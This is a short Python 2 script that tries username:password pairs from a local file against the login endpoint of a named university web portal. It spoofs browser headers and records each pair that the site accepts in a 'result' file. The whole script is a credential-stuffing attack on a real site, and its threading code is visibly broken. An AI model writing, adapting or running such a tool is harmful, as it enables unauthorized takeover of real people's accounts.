# -*- coding: utf-8 -*-

import urllib
import urllib2
import httplib
import threading

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Host': 'w.nuaa.edu.cn',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0',
    'Referer': 'http://w.nuaa.edu.cn/iPortal/index.htm',
    'Connection': 'Keep-Alive'
}
lock = threading.Lock()
def userScan():
    global headers
    global outFile

    conn = httplib.HTTPConnection("w.nuaa.edu.cn")

    while True:
        lock.acquire()
        line = inFile.readline()
        userData = line.strip().split(':')
        lock.release()
        user = userData[0]
        passwd = userData[1]
        params = urllib.urlencode({'username': user, 'password': passwd, 'domain': 1, 'saved': 0, 'from': '003cc944be32e25365428f2dd2adbbe2'})
        conn.request(method="POST", url="/iPortal/action/doLogin.do", body=params, headers=headers)
        responseText = conn.getresponse().read().decode('utf8')
        print responseText
        if responseText.find(u'您已经成功登陆') > 0 :
            print '*** Get user:', user, 'with password:', passwd, '***'
            outFile.write(user + '    ' + passwd + '\n')

outFile = open('result', 'w')
with open('userpass', 'r') as inFile:
    for i in range(10):
        threading.Thread(target = userScan())

outFile.close()
